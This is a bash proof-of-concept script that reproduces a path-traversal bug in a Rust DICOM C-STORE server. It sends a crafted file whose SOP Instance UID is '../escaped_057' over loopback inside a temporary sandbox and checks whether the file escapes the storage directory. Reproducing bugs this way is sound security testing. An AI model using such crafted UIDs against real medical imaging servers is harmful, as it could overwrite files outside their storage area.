#!/usr/bin/env bash
# Real, two-real-binary, real-loopback-TCP reproduction.
#
# Runs the actual `dicom-storescp` binary as a real DICOM C-STORE SCP listening on a real TCP
# port, and the actual `dicom-storescu` binary as a real DICOM C-STORE SCU, sending a genuine
# DICOM file whose Media Storage SOP Instance UID contains a path traversal sequence. Both
# binaries run their real association negotiation and C-STORE exchange over a real loopback
# socket - nothing here hand-constructs PDU bytes or calls internal functions directly.
#
# Usage: run_e2e.sh <path-to-clone-dir>
set -euo pipefail

CLONE_DIR="$1"
PORT=23999
SANDBOX="$(mktemp -d)"
RECEIVED_DIR="$SANDBOX/received"
mkdir -p "$RECEIVED_DIR"
ESCAPE_TARGET="$SANDBOX/escaped_057.dcm"
rm -f "$ESCAPE_TARGET"

cleanup() {
    if [ -n "${SCP_PID:-}" ]; then
        kill "$SCP_PID" 2>/dev/null || true
        wait "$SCP_PID" 2>/dev/null || true
    fi
}
trap cleanup EXIT

echo "sandbox: $SANDBOX"

# build the real binaries from the clone
cargo build --manifest-path "$CLONE_DIR/Cargo.toml" -p dicom-storescp -p dicom-storescu >/dev/null

STORESCP_BIN="$CLONE_DIR/target/debug/dicom-storescp"
STORESCU_BIN="$CLONE_DIR/target/debug/dicom-storescu"

# build the evil-file maker (path-depends on $CLONE_DIR, see its Cargo.toml)
cargo build --manifest-path "$(dirname "$0")/make_evil_file/Cargo.toml" >/dev/null
MAKE_EVIL_BIN="$(dirname "$0")/make_evil_file/target/debug/make_evil_file"

EVIL_FILE="$SANDBOX/evil.dcm"
"$MAKE_EVIL_BIN" "$EVIL_FILE" "../escaped_057"

# start the real SCP
"$STORESCP_BIN" --promiscuous -o "$RECEIVED_DIR" -p "$PORT" > "$SANDBOX/storescp.log" 2>&1 &
SCP_PID=$!
sleep 1

# run the real SCU against it over a real loopback TCP connection
"$STORESCU_BIN" "127.0.0.1:$PORT" "$EVIL_FILE" > "$SANDBOX/storescu.log" 2>&1 || true

sleep 0.5
kill "$SCP_PID" 2>/dev/null || true
wait "$SCP_PID" 2>/dev/null || true
SCP_PID=""

echo "--- storescp log ---"
cat "$SANDBOX/storescp.log"
echo "--- received/ contents ---"
ls -la "$RECEIVED_DIR"
echo "--- checking for escape ---"

if [ -f "$ESCAPE_TARGET" ]; then
    echo "BUG REPRODUCED: file escaped to $ESCAPE_TARGET, outside $RECEIVED_DIR"
    rm -rf "$SANDBOX"
    exit 1
else
    echo "no escape: file stayed inside $RECEIVED_DIR (or was rejected)"
    rm -rf "$SANDBOX"
    exit 0
fi
